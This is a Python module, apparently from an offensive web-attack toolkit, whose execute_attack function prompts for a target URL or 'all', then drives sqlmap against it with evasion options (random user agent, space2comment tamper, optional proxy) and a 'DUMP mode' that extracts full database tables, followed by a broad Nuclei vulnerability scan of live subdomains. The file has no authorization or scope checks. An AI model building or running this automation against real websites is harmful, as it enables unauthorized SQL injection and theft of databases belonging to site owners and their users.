import os
import shutil
import subprocess
import sys
from core.utils import G, C, Y, R, W
from core.logging import export_results

def execute_attack(urls, args):
    print(f"\n{C}[+] Select target number to exploit (1-{len(urls)}) or type '{Y}all{C}': {W}", end="")
    try:
        choice = input().strip()
    except EOFError:
        print(f"\n{R}[-] Input interrupted.{W}")
        return
    
    sqlmap_args = [
        "--batch",
        "--random-agent",
        f"--level={args.level}",
        f"--risk={args.risk}",
        "--forms",
        "--threads=5",
        "--tamper=space2comment",
        "--timeout=10",
        "--retries=2",
    ]
    if args.proxy:
        sqlmap_args.append(f"--proxy={args.proxy}")
    if args.delay > 0:
        sqlmap_args.append(f"--delay={args.delay}")

    if args.dump:
        action_flags = ["--dbs", "--tables", "--dump"]
        print(f" {R}[!] DUMP mode active - full table extraction enabled.{W}")
    elif args.tables:
        action_flags = ["--dbs", "--tables"]
    else:
        action_flags = ["--dbs"]

    print(f"\n{Y}[*] Handing targets off to SQLMap...{W}")
    print(f" {C}[>] Level: {G}{args.level}{W}  Risk: {G}{args.risk}{W}  Forms: {G}ON{W}  Tamper: {G}space2comment{W}  Threads: {G}5{W}\n")

    if choice.lower() == 'all':
        print(f"{G}[+] Launching mass parallel checks...{W}\n")
        cmd = ["sqlmap", "-m", ".targets.txt"] + sqlmap_args + action_flags
        try:
            subprocess.run(cmd, check=False)
        except Exception as e:
            print(f"{R}[-] SQLMap execution failed: {e}{W}")
        export_results()
    else:
        try:
            val = int(choice) - 1
            if 0 <= val < len(urls):
                selected = urls[val]
                print(f"{G}[+] Testing endpoint: {W}{selected}\n")
                cmd = ["sqlmap", "-u", selected] + sqlmap_args + action_flags
                try:
                    subprocess.run(cmd, check=False)
                except Exception as e:
                    print(f"{R}[-] SQLMap execution failed: {e}{W}")
                export_results()
            else:
                print(f"{R}[-] Error: Invalid target index selection.{W}")
        except ValueError:
            print(f"{R}[-] Error: Non-numeric selection provided.{W}")

    if shutil.which("nuclei") and os.path.exists(".live_subs.txt"):
        print(f"\n{C}[>] Running Nuclei (broad vulnerability scan on live hosts)...{W}")
        try:
            subprocess.run(
                ["nuclei", "-l", ".live_subs.txt", "-silent",
                 "-severity", "medium,high,critical", "-stats"],
                check=False
            )
        except Exception as e:
            print(f"{R}[-] Nuclei failed: {e}{W}")
